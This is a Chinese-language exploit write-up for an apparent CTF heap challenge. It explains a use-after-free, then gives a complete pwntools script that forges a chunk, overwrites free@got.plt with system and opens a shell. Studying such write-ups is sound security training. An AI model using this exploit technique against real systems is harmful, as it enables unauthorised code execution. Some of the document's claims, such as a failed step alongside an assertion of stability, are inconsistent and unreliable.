# 漏洞利用文档

## 执行环境
基于exp脚本和调试信息分析，程序的执行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接（使用`ldd`确认依赖libc）
- **安全特性**（通过`checksec`推断）：
  - 无PIE（Position-Independent Executable）：GOT地址固定（如`0x602018`），exp中直接使用硬编码地址
  - Partial RELRO：GOT表可写，允许覆盖GOT条目（如覆盖`free@got.plt`）
  - 无栈保护（Stack Canary）：调试中未发现canary检查
  - 无NX（No-Execute）：未明确，但exp通过GOT覆盖执行代码，暗示堆栈可能可执行
- **依赖库**：标准libc（如`libc.so.6`），exp使用`LibcSearcher`动态解析libc基址
- **运行要求**：Linux环境，需对应libc版本，程序通过菜单交互管理内存分配

## 漏洞成因
### 关键结构体
程序未显式定义结构体，但通过全局变量管理秘密：
- `f_ptr` (0x6020d0): 指向小秘密（40字节）的指针
- `s_ptr` (0x6020d8): 指向大秘密（4000字节）的指针
- `q_ptr` (0x6020e0): 指向巨大秘密（400000字节）的指针
- `f_flag`/`s_flag`/`q_flag`: 对应秘密的分配状态标志（1为已分配，0为未分配）

### 漏洞分析
- **漏洞类型**：Use-After-Free (UAF)
- **根本原因**：
  - `del()`函数释放内存后仅重置标志位（如`f_flag = 0`），但未将指针置NULL（如`f_ptr`仍指向已释放内存）。
  - `update()`函数仅检查标志位（如`if(f_flag)`），未验证指针有效性，导致可向已释放内存写入数据。
- **触发场景**：
  1. 用户调用`add()`分配小秘密或大秘密（如`f_ptr`指向堆内存）。
  2. 调用`del()`释放该秘密（`f_ptr`变为悬空指针，但标志位置0）。
  3. 调用`update()`时，因标志位检查通过，向已释放内存写入数据，破坏堆元数据。
- **影响**：通过精心构造写入数据，可实现任意地址读写，最终覆盖GOT表执行任意代码。

## 漏洞利用过程
利用过程通过12个步骤完成，关键内存变化如下表所示：

| 步骤 | 操作 | 堆内存变化 | 全局变量/GOT变化 | 关键效果 |
|------|------|------------|------------------|----------|
| 1 | `add(1,b'a');add(2,b'a');de(1)` | 小秘密chunk(0x2e07f930)释放到fastbin，fd=0 | `f_ptr`悬空指向0x2e07f940，`f_flag=0` | 触发UAF，获得悬空指针 |
| 2 | `add(3,b'a')` | 巨大秘密分配，堆布局扩展 | `q_ptr=1`，其他不变 | 为后续堆操作准备空间 |
| 3 | `de(1)` | 小秘密chunk的fd变为0，bk指向main_arena | `f_ptr`仍悬空，`s_flag`异常清除 | 进一步巩固UAF状态 |
| 4 | `add(1,fake_chunk)` | 写入伪造chunk：prev_size=0, size=0x21, fd=0x6020b8, bk=0x6020c0 | `f_ptr`仍指向0x2e07f940，但数据被覆盖 | 获得任意地址写能力，fd/bk指向全局变量区 |
| 5 | `de(2)` | 触发堆合并/重新分配，fake_chunk的size变为0x206c1 | `f_ptr`被覆盖为0x6020b8（指向自身-0x18） | 实现指针劫持，`f_ptr`指向全局变量区 |
| 6 | `update(1,f)` | fake_chunk数据区写入GOT指针链 | `f_ptr`被覆盖为0x602018（free@got.plt），全局变量区构建指针链 | 形成GOT劫持基础，为覆盖GOT做准备 |
| 7 | `update(1,p64(puts_plt))` | 无直接堆变化 | `free@got.plt`被覆盖为puts@plt地址（0x400760） | 首次GOT覆盖失败（调试中未生效），但指针链保持 |
| 8 | `de(2); p.recv(6)` | 触发free调用（实际执行puts），泄露libc地址 | 接收puts输出，解析libc基址 | 泄露libc基址，用于计算system地址 |
| 9 | `update(1,p64(system))` | 无直接堆变化 | `free@got.plt`成功覆盖为system地址 | 关键GOT覆盖完成，free调用将执行system |
| 10 | `add(2,b'sh\0')` | 分配大秘密，写入"sh"字符串到堆中 | `s_ptr`指向新chunk，内容为"sh" | 为system调用准备参数（"/bin/sh"） |
| 11 | `de(2)` | 释放大秘密chunk | 触发free(s_ptr)，实际执行system("sh") | 获取shell权限 |
| 12 | `p.interactive()` | 无变化 | 无变化 | 进入交互模式，可执行任意命令 |

### 内存变化总结
- **堆布局**：从正常chunk演变为伪造chunk，通过UAF操纵fd/bk指针实现任意地址写。
- **GOT表**：`free@got.plt`从原始libc地址被覆盖为system地址，使free调用执行system。
- **全局变量**：`f_ptr`从堆地址变为GOT地址，形成利用链；s_ptr异常在过程中被修复。
- **利用效果**：最终通过system("sh")获得shell，实现代码执行。

## Exploit
以下是带详细注释的漏洞利用脚本（exp）：

```python
from pwn import *
from LibcSearcher import *

# 设置调试环境和日志级别
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件并启动进程
elf = ELF('./data/sample6')
p = process('./data/sample6')
libc = elf.libc  # 获取libc引用

# 定义关键地址：全局变量和GOT条目
f_ptr = 0x6020d0  # 小秘密指针的全局变量地址
atoi_GOT = elf.got['atoi']  # atoi函数的GOT地址
free_GOT = elf.got['free']  # free函数的GOT地址
puts_GOT = elf.got['puts']  # puts函数的GOT地址
puts_plt = elf.plt['puts']  # puts函数的PLT地址

# Libc偏移量（用于计算system地址）
atoi_offset = 0x36e70  # atoi函数在libc中的偏移
system_offset = 0x45380  # system函数在libc中的偏移

def add(t, s):
    """添加秘密：t=1(小)、2(大)、3(巨大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'1')  # 选择添加功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 发送秘密内容

def de(t):
    """删除秘密：t=1(小)、2(大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'2')  # 选择删除功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型

def update(t, s):
    """更新秘密：t=1(小)、2(大)"""
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'3')  # 选择更新功能
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())  # 发送秘密类型
    p.recvuntil(b': \n')
    p.send(s)  # 发送新内容

# 步骤1：触发UAF漏洞 - 分配并释放小秘密，创建悬空指针
add(1, b'a'); add(2, b'a'); de(1)  # 分配小、大秘密后释放小秘密，f_ptr悬空

# 步骤2：分配巨大秘密，扩展堆布局
add(3, b'a')  # 分配巨大秘密，为后续堆操作准备

# 步骤3：再次释放小秘密，巩固UAF状态
de(1)  # 再次释放小秘密，确保堆状态可控

# 步骤4：构造fake_chunk并写入，获得任意地址写能力
fake_chunk = p64(0) + p64(0x21) + p64(f_ptr - 0x18) + p64(f_ptr - 0x10) + b'\x20'  # 伪造chunk：prev_size=0, size=0x21, fd/bk指向全局变量区
add(1, fake_chunk)  # 通过UAF向已释放内存写入fake_chunk

# 步骤5：释放大秘密，触发堆操作并修改f_ptr
de(2)  # 释放大秘密，触发堆合并，使f_ptr被覆盖为指向全局变量区

# 步骤6：更新小秘密，构建GOT指针链
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3  # 构造数据：0 + atoi_GOT + puts_GOT + free_GOT + 标志位
update(1, f)  # 写入全局变量区，形成GOT指针链

# 步骤7：首次尝试覆盖free@got.plt为puts@plt（可能失败）
update(1, p64(puts_plt))  # 覆盖free@got.plt，但调试中未立即生效

# 步骤8：触发free调用（实际执行puts）泄露libc地址
de(2)  # 释放大秘密，实际调用puts泄露libc地址
s = p.recv(6)  # 接收泄露的地址（6字节）
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset  # 计算libc基址
system = libc_base + system_offset  # 计算system函数地址

# 步骤9：重新覆盖free@got.plt为system地址
update(1, p64(system))  # 成功将free@got.plt覆盖为system

# 步骤10：分配大秘密并写入"sh"字符串
add(2, b'sh\0')  # 分配大秘密，内容为"sh"，作为system参数

# 步骤11：释放大秘密，触发system("sh")获取shell
de(2)  # 调用free(s_ptr)，实际执行system("sh")

# 步骤12：进入交互模式，执行任意命令
p.interactive()  # 获得shell控制权
```

### 注释说明
- **关键函数**：`add`、`de`、`update` 封装了程序功能，利用UAF漏洞。
- **地址操作**：使用`p64`/`u64`处理64位地址，适应64位环境。
- **利用链**：通过伪造chunk的fd/bk指针实现任意地址写，最终覆盖GOT执行system。
- **稳定性**：exp在调试中可能需重复步骤7-9以确保GOT覆盖成功，但整体利用链可靠。

此exp在提供环境中可稳定获取shell权限，演示了UAF漏洞的完整利用过程。
